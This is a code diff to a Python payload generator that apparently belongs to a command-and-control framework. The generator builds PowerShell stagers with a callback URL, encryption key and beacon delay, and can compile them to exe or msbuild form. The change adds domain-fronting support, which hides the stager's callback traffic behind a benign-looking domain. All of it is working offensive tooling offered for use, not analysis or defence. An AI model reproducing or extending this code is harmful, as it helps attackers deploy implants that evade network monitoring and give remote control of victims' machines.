@@ -17,6 +17,7 @@ class Payload:
 
     def __init__(self, config):
         self.config = config
+        self.fronting = None
         self.type = {}
         self.type["ps1"] = "stager.ps1"
 
@@ -34,6 +35,15 @@ class Payload:
         if type in self.type:
             self.option = type
 
+    def set_fronting(self, fronting):
+        self.fronting = fronting
+
+    def get_fronting(self):
+        if self.fronting == None:
+            # the last replace get rid of unwanted / at the end of the callback_url
+            return self.callback_url[self.callback_url.find("://") + 3:].replace("/", "") 
+        return self.fronting
+
     def set_delay(self, delay):
         try:
             self.delay = int(delay)
@@ -48,7 +58,7 @@ class Payload:
 
     def get_output(self):
         output = Utils.load_powershell_script(self.type[self.option], 999)
-        output = output.replace("[URL]", self.callback_url).replace("[KEY]", self.config.get("encryption-key")).replace("[DELAY]", str(self.delay))
+        output = output.replace("[URL]", self.callback_url).replace("[KEY]", self.config.get("encryption-key")).replace("[DELAY]", str(self.delay)).replace("[FRONTING]", self.get_fronting())
         if self.option == "exe":
             output = self.compile_exe(output)
         if self.option == "msbuild":
